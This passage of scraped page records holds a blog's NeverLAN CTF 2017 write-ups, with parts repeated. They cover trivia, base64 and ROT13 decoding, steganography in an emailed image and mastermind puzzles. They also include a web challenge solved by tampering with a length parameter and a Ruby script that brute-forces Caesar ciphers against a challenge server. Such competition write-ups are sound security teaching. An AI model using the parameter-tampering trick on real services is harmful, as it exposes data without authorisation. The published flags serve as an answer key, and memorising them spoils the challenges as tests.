[0,1,7,9] are the four numbers (we have the four numbers so now let's order them) line 2: place [1,x,7,x] line 5: place [1,x,7,0] so  [1,9,7,0] flag is 1970 share please enable javascript to view the comments powered by disqus. follow: newer xiomara ctf 2017 - write-ups older ruby cheat sheet with examples recents security writeups uiuctf 2017 - 100 - high school crypto - crypto sunday 30 april 2017 (2017-04-30) security writeups angstromctf 2017 - write-ups saturday 29 april 2017 (2017-04-29) security writeups breizhctf 2k17 - write-ups saturday 29 april 2017 (2017-04-29) security writeups yubitsec ctf 2017 - write-ups tuesday 25 april 2017 (2017-04-25) security writeups fit-hack ctf 2017 - write-ups saturday 15 april 2017 (2017-04-15) categories linux archlinux debian opensuse ubuntu misc news security warez programming python ruby security centos windows writeups windows tag cloud anonymity apache archlinux backdoor centos crypto debian firefox forensics graphic guessing hyper-v install linux misc netbios network news opensuse pentest piracy privacy programming proxy python qemu recon reverse reversing ruby security stegano system trivia ubuntu update usenet virtualbox virtualization vulnerability warez webshell windows writeups archives april 2017 march 2017 february 2017 january 2017 december 2016 november 2016 october 2016 september 2016 august 2016 july 2016 june 2016 may 2016 april 2016 march 2016 december 2015 october 2015 september 2015 november 2014 october 2014 september 2014 august 2014 december 2012 links hexo foss torrent is not a crime \u00a9 2017 alexandre zanni powered by hexo . theme by ppoffice custom scripts ssl redirect",
    "title": "NeverLAN",
    "url": "http://rawsec.ml/en/NeverLAN-CTF-2017-write-ups/#50-neverlan-recon"
  },
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "Informations\nVersion\n\n\n\nBy\nVersion\nComment\n\n\n\n\nnoraj\n1.0\nCreation\n\n\n\nCTF\n\nName : NeverLAN CTF 2017\nWebsite : neverlanctf.com\nType : Online\nFormat : Jeopardy\nCTF Time : link\n\n50 - Encoding Apprentice -",
    "meta_og_title": "NeverLAN CTF 2017 - Write-ups",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 37.92185125943859,
    "tag_title": "",
    "tags": "",
    "text": "security is everywhere home linux news security about security writeups neverlan ctf 2017 - write-ups monday 27 february 2017 (2017-02-27) forensics security writeups informations version version comment noraj creation name : neverlan ctf 2017 website neverlanctf.com type : online format : jeopardy ctf time link 50 - encoding apprentice - trivia what common encoding practice\u2019s title contains the square of 8 and occasionally ends with an \u201c=\u201d, or \u201c==\u201d? answer: base64 50 - shifty ciphers\u2026 - trivia what cipher is the shiftiest of them all? he even has his own salad\u2026 answer: caesar 50 - know your extensions - trivia unix and linux use this (instead of a file extension) to determine what format a file is. answer: magic numbers 50 - mmmm... ssl - trivia what is the standard, secure, size of an ssl certificate? answer: 2048 50 - don't eat me - trivia i allow http to act as a stateful protocol instead of the stateless protocol it actually is. just a small piece of data sent from a website... answer: cookie 50 - neverlan - recon we've been known to leak things on twitter... go to neverlanctf twitter: https://twitter.com/neverlanctf there is an interesting twitter status rnfl erpba vf rnfl. synt{vas0ezngvba_vf_c0jre_xa0j_l0he_nqirefnel} #commoncaesercipher i tried a rot13 and i got that: easy recon is easy. flag{inf0rmation_is_p0wer_kn0w_y0ur_adversary} flag is inf0rmation_is_p0wer_kn0w_y0ur_adversary 100 - purvesta - recon purvesta also really likes his twitter... neverlan ctftime page: https://ctftime.org/team/32118 purvesta ctftime page: https://ctftime.org/user/23157 purvesta name is: tanner purves , his linkedin page is not working. so i searched for twitter tanner purves and found his twitter page @purvesta0704 his twitter descripton says: \\\\\\bsu &apos;20, co-founder of the neverlan ctf/// {zmxhz3txmhdfetb1x0fym19hzxr0aw5nx2cwmgrfyxrfvghpnx0=} it looks like a base64 string: $ printf %s &apos;zmxhz3txmhdfetb1x0fym19hzxr0aw5nx2cwmgrfyxrfvghpnx0=&apos; | base64 -d flag{w0w_y0u_ar3_getting_g00d_at_thi5} 50 - soyoulikemusic - forensics soyoulikemusic.class we can use strings on the java class: $ strings soyoulikemusic.class scan ljava/util/scanner; <init> code linenumbertable main ([ljava/lang/string;)v decompilingthecodenow qone stackmaptable qtwo qthree playgame sourcefile soyoulikemusic.java java/util/scanner oahh welcome... so i hear you like music? what might i call you fellow listener? java/lang/stringbuilder well 4, let&apos;s play a game and see how much you like music. uwho was the special artist to dj music for our live streams before the event started? s7a73farm try again... @now you are on a roll! what is zestyfe&apos;s favorite type of music? dubstep =final question! what is the name of purvesta&apos;s only rap song? the_gettysburg_address_rap |i will ask you three questions. if you can answer them all right, then i will point you towards your precious flag you seek! want to play? (y/n) ;great let&apos;s play! (ctrl-c if you really don&apos;t want to play) congratulations!! you did it!! 8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= soyoulikemusic java/lang/object java/lang/string java/lang/system ljava/io/inputstream; (ljava/io/inputstream;)v ljava/io/printstream; java/io/printstream println (ljava/lang/string;)v nextline ()ljava/lang/string; trim append -(ljava/lang/string;)ljava/lang/stringbuilder; tostring equals (ljava/lang/object;)z equalsignorecase (ljava/lang/string;)z exit (i)v focus on: congratulations!! you did it!! 8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= that looks like base64: printf %s &apos;8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0=&apos; |base64 -d \ud927\udc45\ufffd\ufffdm\u0465\ufffd\ufffd}]\ufffd\ufffd\u0465\ufffd\ufffd}=\ufffd}\ufffd\ufffd\ufffd\u0655\ufffd\u0444\ufffd\ufffd}5\ufffd\ufffd\u0445\ufffd\ufffd\ufffdbase64: invalid input that's wrong let's execute the java class, we know teh answers: $ java -cp . soyoulikemusic ahh welcome... so i hear you like music? what might i call you fellow listener? alex well alex, let&apos;s play a game and see how much you like music. i will ask you three questions. if you can answer them all right, then i will point you towards your precious flag you seek! want to play? (y/n) great let&apos;s play! (ctrl-c if you really don&apos;t want to play) who was the special artist to dj music for our live streams before the event started? s7a73farm now you are on a roll! what is zestyfe&apos;s favorite type of music? dubstep final question! what is the name of purvesta&apos;s only rap song? the_gettysburg_address_rap congratulations!! you did it!! zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= there was only a before our base64 string: $ printf %s &apos;zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0=&apos; | base64 -di flag{still_waiting_on_purvesta&apos;s_mixtape} note : this is not forensics. 300 - just-a-selfie - forensics you've been put in charge of a very secret project. there's talk that some of your data has leaked out. your security analyst has flagged this email as \"out of place\". has your company been breached? hmm.. binwalk. now that's a useful tool! $ file email.txt email.txt: smtp mail, ascii text this is a mail with a attached image. --apple-mail=_9c94b8c8-a2cf-4892-8e1b-a89a4c3eae03 content-transfer-encoding: base64 content-disposition: inline; filename=selfie.jpg content-type: image/jpeg; x-unix-mode=0644; name=\"selfie.jpg\" content-id: < [email\u00a0protected] the image is base64 encoded, and split between line 92 and line 12617. of course, binwalk is useless here: 1369          0x559           html document header 4003          0xfa3           html document footer 9689          0x25d9          unix path: /wqckbqxdjshoqrujuixzonp/kk81v7p/kjzn4bfg73qguf/0pu9 11085         0x2b4d          unix path: /4rd4z6zcuzzplnxirjby/i/qgv9n/dfxvl4aeo+t0 13229         0x33ad          unix path: /enn/y/huxtvl8wx5yrjljz/xfcvzqtpdqfrph3dhfzntj8ek7l4h3 13284         0x33e4          unix path: /nakvugimce9bjok2f2dpax8c/f/w/p+zfd9pw4ka4+sp5mz7dk8oeijhsjktn7js/sc0pxnmnsl 14560         0x38e0          unix path: /wcei0l/aj8i/wdvqtxbcooy/ktz6uv2 15287         0x3bb7          unix path: /qk6f4i/c/vfhgu/wbs+mdbxxmhweuzirfiuagaquon1p0rxlrvlc+hdp6rri8rvvdfhtxrpk8h 22696         0x58a8          unix path: /8e/ke8hmukjewaobkde/9c/jvzihnpfvmr2or8qzwppjhfvqm7ngjsdwt 23242         0x5aca          unix path: /jivyx2f9h6ljj/p/j/gvqmszd+0kcm1zrcqbhuh7wgielgamcy 25527         0x63b7          unix path: /vx4z/scea/b/hq2iksi7rufjaedu/gf5ivmlzahq+1jsxni/p8a+fhxw1dwhrdwglbbnt3bzlay 26919         0x6927          unix path: /g9ya7q2ig9/4sko4xz1zss1b/afycehbbrxxjjlmapufiimmec/dd4van4j1k8uibwym1 29935         0x74ef          unix path: /ai/ptd3ivudkzwopswp/ai7x2xdzldg7m20ae5r8q/2lvhlfed4yeil/ 33346         0x8242          unix path: /8d2v8h6gahraduc54969p/aj8x/8acc/h 35802         0x8bda          unix path: /kvzns/bo8a61ebdzjlfghkzuaor1/ovn74k/fc58q 36928         0x9040          unix path: /klcp/1giwfy1z2ssrixwx5to/vyrq4ilu/fsixlylb5mucoaplj/xrkufev1e4s4k/nygb 42880         0xa780          unix path: /a/e/hdrqwxbwk1y/pqu4uf+i/1r4a1ihrjysj93x07100am 43257         0xa8f9          unix path: /z8yukjgpsany/ebz8p6bqwdg/2vm/ij5h5gsq/8k3fmc0bxzpuyd0ki 49189         0xc025          unix path: /rtr4uwlzdob3z/kvfv2z/gr8ufgaewhfdaalatoo3y/ehduf1a/c 50244         0xc444          unix path: /ljkcghrv/rnxom6pfljmt/lknhzr3wgpmr5aa2/xvteg5f3k0bn6hh+fwqprmnhtbwmi7rob95b 53176         0xcfb8          unix path: /8e7tbw30/xjresflytmlve5/igswa/ja+hzkq6oaqs6yp0pmkqipqh9ikxzpt7tvml5ry 55034         0xd6fa          unix path: /wbivxnbfomn6hp91bfwyspsy/ugqx/dgpxa/wcfjtp+/wak+8fip90n8kpi 60216         0xeb38          unix path: /trd66liuarwaeewi6sdhv/u/lt/f1+19quuo 65339         0xff3b          unix path: /ambrzl/hb3ib/oi3x5mvadfxpswhbsz//9p4g8a+ab3vnm1hxqztjpem3kfossmvnkrlvwow 67005         0x105bd         stuffit deluxe segment (data): fpw74o1el5vrgobi3phrkc [...] so let's extract the base64 string, join it, decode it and save the ouput in a file (with a ruby script of course). require \"base64\" line_no = selfie_b64 = file.open( \"email.txt\" |file| file.each |line| line_no >= && line_no <= 12617 selfie_b64 += line.chomp line_no += selfie_plain = base64.decode64(selfie_b64) file.open( \"selfie.jpg\" |file| file.write(selfie_plain) i obtained this picture: $ file selfie.jpg selfie.jpg: jpeg image data, jfif standard 1.01, aspect ratio, density 72x72, segment length 16, exif standard: [tiff image data, big-endian, direntries=2, orientation=upper-left], baseline, precision 8, 820x618, frames 3 this image seems to hide something else (trailing data): $ binwalk selfie.jpg decimal       hexadecimal     description -------------------------------------------------------------------------------- 0             0x0             jpeg image data, jfif standard 1.01 30            0x1e            tiff image data, big-endian, offset of first image directory: 8 128969        0x1f7c9         zip archive data, at least v2.0 to extract, name: death_star_owner&apos;s_technical_manual_blueprints.jpg 712883        0xae0b3         zip archive data, at least v1.0 to extract, name: __macosx/ 712938        0xae0ea         zip archive data, at least v2.0 to extract, name: __macosx/._death_star_owner&apos;s_technical_manual_blueprints.jpg 713908        0xae4b4         end of zip archive then i extracted it with foremost and unzip the archive: $ unzip 00000251.zip archive:  00000251.zip inflating: death_star_owner&apos;s_technical_manual_blueprints.jpg creating: __macosx/ inflating: __macosx/._death_star_owner&apos;s_technical_manual_blueprints.jpg finally, i get this death star elevation plan: flag is rebellions_are_built_on_hope note : this is steganography, not forensics. 100 - thehistoryofcryptography - cryptography the_history_of_cryptography.zip contains two files: 0.txt 1.zip $ cat 0.txt this shifty cipher is one of the simplest, and most well know ciphers. answer: caesar the zip is password protected and the password is the answer of 0.txt 1.zip contains 2 files: 1.txt 2.zip , and so on. $ cat 1.txt this cipher is is named after the person who made it famous, not but the man who first created it. password:\"the name of cipher in the riddle\" with out the quotes. answer: vigenere $ cat 2.txt this transposition cipher was used by the warriors in the famous movie \"the 300\" password:\"the name of cipher in the riddle\" with out the quotes. answer: scytale $ cat 3.txt the first recorded use of this cipher was used to hide a book of magic. password:\"the name of cipher in the riddle\" with out the quotes. answer: steganography details $ cat 4.txt this world famous cipher was invented by arthur scherbius password:\"the name of cipher in the riddle\" with out the quotes. answer: enigma machine details $ cat 5.txt which one is you&apos;re favorite? i love them all because... flag{thehistoryofcryptographyisaw3s0m3} flag is thehistoryofcryptographyisaw3s0m3 note : this challenge was a quizz, not a cryptography challenge. it should have been in trivia, misc, quizz or other. 100 - a slight cut - web http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/ source: <!doctype html> <html> <head> <title>a slight cut</title> <script> [...] </script> </head> <body> <div> <h1>type in some text to have the server repeat it back</h1> <form onsubmit=\"getecho(); return false;\"> <input id=\"text\" name=\"text\" type=\"text\" placeholder=\"type some text here\"/> <input id=\"length\" type=\"hidden\" name=\"length\" value=\"0\"/> <input type=\"submit\"/> </form> <p id=\"echo\">output will appear here</p> </div> </body> </html> there is two parameters in te request url: length text text comes from the input field, and length is calculated with javascript. function getecho text = $( '#text' ).val(); length = $( '#length' ).val(); $.ajax( 'echo.php?length=' +length+ '&text=' +text).done( function echoed '#echo' ).text(echoed); document ).ready( function '#text' ).on( 'input' function '#length' ).val($( '#text' ).val().length); if i submit , the calculated length is get /echo.php?length=1&text=a http/1.1 host: neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123 user-agent: mozilla/5.0 (x11; linux x86_64; rv:51.0) gecko/20100101 firefox/51.0 accept: */* accept-language: en-us,en;q=0.5 accept-encoding: gzip, deflate referer: http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/ x-requested-with: xmlhttprequest connection: close but what will happen if i change the value from 1 to 1000 with burp: get /echo.php?length=1000&text=a http/1.1 the server displays more than intended: [email\u00a0protected] kds2^4a ady 5 tyusft tuyuy_#65afajty ajb tjuflt ty%&(juuyttyjtji key: flag{bleeding_in_javascript} sdf4 asd6f ayj1dsgff@ af ttmtum56tu$%ga wrg3@#%aa9-mtyumty dfgsaumg68g$%ershe as 9tuyt t9uty38dsdfg-5f htyd45s#$ flag is: bleeding_in_javascript 300 - webcipher - web #anti-human http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/ word list: https://s3-us-west-2.amazonaws.com/neverlanctf/files/words.txt source: <!doctype html> html head title anti-human cipher title head body \"cipher_box\" \"cipher\" shhsjwfl \"form_box\" form \"form\" method \"get\" action input type \"text\" name \"deciphered\" \"deciphered\" input type \"submit\" form body html first thing is to understand what to do. here is what the server do: a word is picked up randomly from words.txt this word is randomly rotated (caesar cipher with a shift between 1 and 25) then the shifted word is displayed for a few seconds a new word is picked up and so on... so we need a script that: get the shifted word cross the dictionary and test words one by one (only same length as teh shifted word) for each tested word try all possible shifting break when that match send the answer (decipered/unshifted word) get the flag so that's what i did with a ruby script and curb $ ruby webcipher.rb \u2022 connexion works \u2022 cracking ciphered word \u2022 deciphered: cassidony \u2022 sending answer \u2022 flag: c34s3r_c1ph3r_70_7h3_m4x my ruby script: #!/usr/bin/env ruby require 'curb' # for get/post requests # from https://gist.github.com/matugm/db363c7131e6af27716c caesar_cipher (string, shift = alphabet   = array( encrypter  = hash[alphabet.zip(alphabet.rotate(shift))] string.chars.map { encrypter.fetch(c, hostname = 'http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/index.php' c = curl::easy.new(hostname) |curl| curl.headers[ 'cookie' 'phpsessid=30ff4361f8af2985595bff7c9614b1f1' curl.headers[ 'referer' ] = hostname curl.headers[ 'upgrade-insecure-requests' #curl.verbose = true # curl c.perform # send the request c.body_str.match( /anti\\-human cipher/ puts '\u2022 connexion works' # get the cipher word ciphered_word = c.body_str.match( /<h1 id=\"cipher\">([a-za-z]*)<\\/h1>/ ).captures[ ciphered_word.downcase! # put lowercase ciphered_word_length = ciphered_word.length puts '\u2022 cracking ciphered word' do_break = false answer = file.open( \"words.txt\" |file| file.each |word| word.chomp! # remove spaces word.length.eql?(ciphered_word_length) # only try word with same length answer = word # save the word because it can be mixed case word.downcase! # put lowercase # puts \"word: #{word}\" ).each # puts caesar_cipher(word, i).join caesar_cipher(word, i).join == ciphered_word puts \"\u2022 deciphered: #{word} do_break = true break break do_break puts \"\u2022 sending answer\" c.url = hostname.concat( \"?deciphered= #{answer} c.perform puts \"\u2022 flag: \" .concat(c.body_str.match( /<p>flag{(.*)}<\\/p>/ ).captures[ note : this is not web, this is scripting. 50 - master mind 1 - other can you break my three digit lock? mastermind1.txt source: +-----------------------+ |       |       |       | |   7   |   3   |   6   | one number is correct but wrongly placed |       |       |       | |_______|_______|_______| |       |       |       | |   0   |   6   |   5   | one number is correct and correctly placed |       |       |       | |_______|_______|_______| |       |       |       | |   3   |   7   |   2   | two numbers are correct but wrongly placed |       |       |       | |_______|_______|_______| |       |       |       | |   6   |   4   |   7   | no numbers are correct |       |       |       | |_______|_______|_______| |       |       |       | |   5   |   2   |   4   | one number is correct and correctly placed |       |       |       | |       |       |       | +-----------------------+ rules: mastermind code-breaking: line 4: 647, no numbers are correct => [0,1,2,3,5,8,9] are possible line 1: 736, one number is correct but wrongly placed => 7 and 6 are wrong, so 3 is in the code and is right or left line 2: 065, one number is correct and correctly placed => 6 is wrong, so 0 or 5 is in the code and corrctly placed line 3: 372, two numbers are correct but wrongly placed => 7 is wrong, 3 and 2 are good so [3,2,[0|5]] are possible line 5: 524, one number is correct and correctly placed => only one number is correct, 2 is good so 5 is wrong and [3,2,0] are possible (we have the three numbers so now let's order them) line 5: 524, one number is correct and correctly placed => 2 is middle line 2: 065, one number is correct and correctly placed => 0 is left so 3 is right flag is 100 - master mind 2 - other i've upgraded my lock! can you solve it? mastermind2.txt source: +-------------------------------+ |       |       |       |       | |   9   |   5   |   3   |   2   | one number is correct but wrongly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   1   |   6   |   7   |   3   | two numbers are correct and correctly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   0   |   6   |   5   |   9   | two numbers are correct but wrongly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   2   |   4   |   3   |   8   | no numbers are correct |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   5   |   2   |   4   |   0   | one number is correct and correctly placed |       |       |       |       | |       |       |       |       | +-------------------------------+ rules: mastermind code-breaking: line 4: 2438, no numbers are correct => only [0,1,5,6,7,9] are possible line 5: 5240, one number is correct and correctly placed => 2 and 4 are wrong, so 0 or 5 is in the code, [[0|5],1,6,7,9] line 1: 9532, one number is correct but wrongly placed => 2 and 3 are wrong, so 9 or 5 is good, [0|5] & [5|9] = 5 so [1,5,6,7] or [0|5] & [5|9] = [0,9] so so [0,1,6,7,9] line 2: 1673, two numbers are correct and correctly placed => only two number are good so [1,5,6,7] impossible so [0,1,6,7,9] is only possible (now we need to filter the 5 numbers to keep only 4) line 1: confirmed [9], possible [0,1,6,7] line 3: confirmed [9,[0|6]], possible [1,7] line 5: confirmed [9,0], possible [1,7] so [0,1,7,9] are the four numbers (we have the four numbers so now let's order them) line 2: place [1,x,7,x] line 5: place [1,x,7,0] so  [1,9,7,0] flag is 1970 share please enable javascript to view the comments powered by disqus. follow: newer xiomara ctf 2017 - write-ups older ruby cheat sheet with examples recents security writeups uiuctf 2017 - 100 - high school crypto - crypto sunday 30 april 2017 (2017-04-30) security writeups angstromctf 2017 - write-ups saturday 29 april 2017 (2017-04-29) security writeups breizhctf 2k17 - write-ups saturday 29 april 2017 (2017-04-29) security writeups yubitsec ctf 2017 - write-ups tuesday 25 april 2017 (2017-04-25) security writeups fit-hack ctf 2017 - write-ups saturday 15 april 2017 (2017-04-15) categories linux archlinux debian opensuse ubuntu misc news security warez programming python ruby security centos windows writeups windows tag cloud anonymity apache archlinux backdoor centos crypto debian firefox forensics graphic guessing hyper-v install linux misc netbios network news opensuse pentest piracy privacy programming proxy python qemu recon reverse reversing ruby security stegano system trivia ubuntu update usenet virtualbox virtualization vulnerability warez webshell windows writeups archives april 2017 march 2017 february 2017 january 2017 december 2016 november 2016 october 2016 september 2016 august 2016 july 2016 june 2016 may 2016 april 2016 march 2016 december 2015 october 2015 september 2015 november 2014 october 2014 september 2014 august 2014 december 2012 links hexo foss torrent is not a crime \u00a9 2017 alexandre zanni powered by hexo . theme by ppoffice custom scripts ssl redirect",
    "title": "Purvesta",
    "url": "http://rawsec.ml/en/NeverLAN-CTF-2017-write-ups/#100-purvesta-recon"
  },
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "Informations\nVersion\n\n\n\nBy\nVersion\nComment\n\n\n\n\nnoraj\n1.0\nCreation\n\n\n\nCTF\n\nName : NeverLAN CTF 2017\nWebsite : neverlanctf.com\nType : Online\nFormat : Jeopardy\nCTF Time : link\n\n50 - Encoding Apprentice -",
    "meta_og_title": "NeverLAN CTF 2017 - Write-ups",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 37.92185125943859,
    "tag_title": "",
    "tags": "",
    "text": "security is everywhere home linux news security about security writeups neverlan ctf 2017 - write-ups monday 27 february 2017 (2017-02-27) forensics security writeups informations version version comment noraj creation name : neverlan ctf 2017 website neverlanctf.com type : online format : jeopardy ctf time link 50 - encoding apprentice - trivia what common encoding practice\u2019s title contains the square of 8 and occasionally ends with an \u201c=\u201d, or \u201c==\u201d? answer: base64 50 - shifty ciphers\u2026 - trivia what cipher is the shiftiest of them all? he even has his own salad\u2026 answer: caesar 50 - know your extensions - trivia unix and linux use this (instead of a file extension) to determine what format a file is. answer: magic numbers 50 - mmmm... ssl - trivia what is the standard, secure, size of an ssl certificate? answer: 2048 50 - don't eat me - trivia i allow http to act as a stateful protocol instead of the stateless protocol it actually is. just a small piece of data sent from a website... answer: cookie 50 - neverlan - recon we've been known to leak things on twitter... go to neverlanctf twitter: https://twitter.com/neverlanctf there is an interesting twitter status rnfl erpba vf rnfl. synt{vas0ezngvba_vf_c0jre_xa0j_l0he_nqirefnel} #commoncaesercipher i tried a rot13 and i got that: easy recon is easy. flag{inf0rmation_is_p0wer_kn0w_y0ur_adversary} flag is inf0rmation_is_p0wer_kn0w_y0ur_adversary 100 - purvesta - recon purvesta also really likes his twitter... neverlan ctftime page: https://ctftime.org/team/32118 purvesta ctftime page: https://ctftime.org/user/23157 purvesta name is: tanner purves , his linkedin page is not working. so i searched for twitter tanner purves and found his twitter page @purvesta0704 his twitter descripton says: \\\\\\bsu &apos;20, co-founder of the neverlan ctf/// {zmxhz3txmhdfetb1x0fym19hzxr0aw5nx2cwmgrfyxrfvghpnx0=} it looks like a base64 string: $ printf %s &apos;zmxhz3txmhdfetb1x0fym19hzxr0aw5nx2cwmgrfyxrfvghpnx0=&apos; | base64 -d flag{w0w_y0u_ar3_getting_g00d_at_thi5} 50 - soyoulikemusic - forensics soyoulikemusic.class we can use strings on the java class: $ strings soyoulikemusic.class scan ljava/util/scanner; <init> code linenumbertable main ([ljava/lang/string;)v decompilingthecodenow qone stackmaptable qtwo qthree playgame sourcefile soyoulikemusic.java java/util/scanner oahh welcome... so i hear you like music? what might i call you fellow listener? java/lang/stringbuilder well 4, let&apos;s play a game and see how much you like music. uwho was the special artist to dj music for our live streams before the event started? s7a73farm try again... @now you are on a roll! what is zestyfe&apos;s favorite type of music? dubstep =final question! what is the name of purvesta&apos;s only rap song? the_gettysburg_address_rap |i will ask you three questions. if you can answer them all right, then i will point you towards your precious flag you seek! want to play? (y/n) ;great let&apos;s play! (ctrl-c if you really don&apos;t want to play) congratulations!! you did it!! 8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= soyoulikemusic java/lang/object java/lang/string java/lang/system ljava/io/inputstream; (ljava/io/inputstream;)v ljava/io/printstream; java/io/printstream println (ljava/lang/string;)v nextline ()ljava/lang/string; trim append -(ljava/lang/string;)ljava/lang/stringbuilder; tostring equals (ljava/lang/object;)z equalsignorecase (ljava/lang/string;)z exit (i)v focus on: congratulations!! you did it!! 8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= that looks like base64: printf %s &apos;8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0=&apos; |base64 -d \ud927\udc45\ufffd\ufffdm\u0465\ufffd\ufffd}]\ufffd\ufffd\u0465\ufffd\ufffd}=\ufffd}\ufffd\ufffd\ufffd\u0655\ufffd\u0444\ufffd\ufffd}5\ufffd\ufffd\u0445\ufffd\ufffd\ufffdbase64: invalid input that's wrong let's execute the java class, we know teh answers: $ java -cp . soyoulikemusic ahh welcome... so i hear you like music? what might i call you fellow listener? alex well alex, let&apos;s play a game and see how much you like music. i will ask you three questions. if you can answer them all right, then i will point you towards your precious flag you seek! want to play? (y/n) great let&apos;s play! (ctrl-c if you really don&apos;t want to play) who was the special artist to dj music for our live streams before the event started? s7a73farm now you are on a roll! what is zestyfe&apos;s favorite type of music? dubstep final question! what is the name of purvesta&apos;s only rap song? the_gettysburg_address_rap congratulations!! you did it!! zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= there was only a before our base64 string: $ printf %s &apos;zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0=&apos; | base64 -di flag{still_waiting_on_purvesta&apos;s_mixtape} note : this is not forensics. 300 - just-a-selfie - forensics you've been put in charge of a very secret project. there's talk that some of your data has leaked out. your security analyst has flagged this email as \"out of place\". has your company been breached? hmm.. binwalk. now that's a useful tool! $ file email.txt email.txt: smtp mail, ascii text this is a mail with a attached image. --apple-mail=_9c94b8c8-a2cf-4892-8e1b-a89a4c3eae03 content-transfer-encoding: base64 content-disposition: inline; filename=selfie.jpg content-type: image/jpeg; x-unix-mode=0644; name=\"selfie.jpg\" content-id: < [email\u00a0protected] the image is base64 encoded, and split between line 92 and line 12617. of course, binwalk is useless here: 1369          0x559           html document header 4003          0xfa3           html document footer 9689          0x25d9          unix path: /wqckbqxdjshoqrujuixzonp/kk81v7p/kjzn4bfg73qguf/0pu9 11085         0x2b4d          unix path: /4rd4z6zcuzzplnxirjby/i/qgv9n/dfxvl4aeo+t0 13229         0x33ad          unix path: /enn/y/huxtvl8wx5yrjljz/xfcvzqtpdqfrph3dhfzntj8ek7l4h3 13284         0x33e4          unix path: /nakvugimce9bjok2f2dpax8c/f/w/p+zfd9pw4ka4+sp5mz7dk8oeijhsjktn7js/sc0pxnmnsl 14560         0x38e0          unix path: /wcei0l/aj8i/wdvqtxbcooy/ktz6uv2 15287         0x3bb7          unix path: /qk6f4i/c/vfhgu/wbs+mdbxxmhweuzirfiuagaquon1p0rxlrvlc+hdp6rri8rvvdfhtxrpk8h 22696         0x58a8          unix path: /8e/ke8hmukjewaobkde/9c/jvzihnpfvmr2or8qzwppjhfvqm7ngjsdwt 23242         0x5aca          unix path: /jivyx2f9h6ljj/p/j/gvqmszd+0kcm1zrcqbhuh7wgielgamcy 25527         0x63b7          unix path: /vx4z/scea/b/hq2iksi7rufjaedu/gf5ivmlzahq+1jsxni/p8a+fhxw1dwhrdwglbbnt3bzlay 26919         0x6927          unix path: /g9ya7q2ig9/4sko4xz1zss1b/afycehbbrxxjjlmapufiimmec/dd4van4j1k8uibwym1 29935         0x74ef          unix path: /ai/ptd3ivudkzwopswp/ai7x2xdzldg7m20ae5r8q/2lvhlfed4yeil/ 33346         0x8242          unix path: /8d2v8h6gahraduc54969p/aj8x/8acc/h 35802         0x8bda          unix path: /kvzns/bo8a61ebdzjlfghkzuaor1/ovn74k/fc58q 36928         0x9040          unix path: /klcp/1giwfy1z2ssrixwx5to/vyrq4ilu/fsixlylb5mucoaplj/xrkufev1e4s4k/nygb 42880         0xa780          unix path: /a/e/hdrqwxbwk1y/pqu4uf+i/1r4a1ihrjysj93x07100am 43257         0xa8f9          unix path: /z8yukjgpsany/ebz8p6bqwdg/2vm/ij5h5gsq/8k3fmc0bxzpuyd0ki 49189         0xc025          unix path: /rtr4uwlzdob3z/kvfv2z/gr8ufgaewhfdaalatoo3y/ehduf1a/c 50244         0xc444          unix path: /ljkcghrv/rnxom6pfljmt/lknhzr3wgpmr5aa2/xvteg5f3k0bn6hh+fwqprmnhtbwmi7rob95b 53176         0xcfb8          unix path: /8e7tbw30/xjresflytmlve5/igswa/ja+hzkq6oaqs6yp0pmkqipqh9ikxzpt7tvml5ry 55034         0xd6fa          unix path: /wbivxnbfomn6hp91bfwyspsy/ugqx/dgpxa/wcfjtp+/wak+8fip90n8kpi 60216         0xeb38          unix path: /trd66liuarwaeewi6sdhv/u/lt/f1+19quuo 65339         0xff3b          unix path: /ambrzl/hb3ib/oi3x5mvadfxpswhbsz//9p4g8a+ab3vnm1hxqztjpem3kfossmvnkrlvwow 67005         0x105bd         stuffit deluxe segment (data): fpw74o1el5vrgobi3phrkc [...] so let's extract the base64 string, join it, decode it and save the ouput in a file (with a ruby script of course). require \"base64\" line_no = selfie_b64 = file.open( \"email.txt\" |file| file.each |line| line_no >= && line_no <= 12617 selfie_b64 += line.chomp line_no += selfie_plain = base64.decode64(selfie_b64) file.open( \"selfie.jpg\" |file| file.write(selfie_plain) i obtained this picture: $ file selfie.jpg selfie.jpg: jpeg image data, jfif standard 1.01, aspect ratio, density 72x72, segment length 16, exif standard: [tiff image data, big-endian, direntries=2, orientation=upper-left], baseline, precision 8, 820x618, frames 3 this image seems to hide something else (trailing data): $ binwalk selfie.jpg decimal       hexadecimal     description -------------------------------------------------------------------------------- 0             0x0             jpeg image data, jfif standard 1.01 30            0x1e            tiff image data, big-endian, offset of first image directory: 8 128969        0x1f7c9         zip archive data, at least v2.0 to extract, name: death_star_owner&apos;s_technical_manual_blueprints.jpg 712883        0xae0b3         zip archive data, at least v1.0 to extract, name: __macosx/ 712938        0xae0ea         zip archive data, 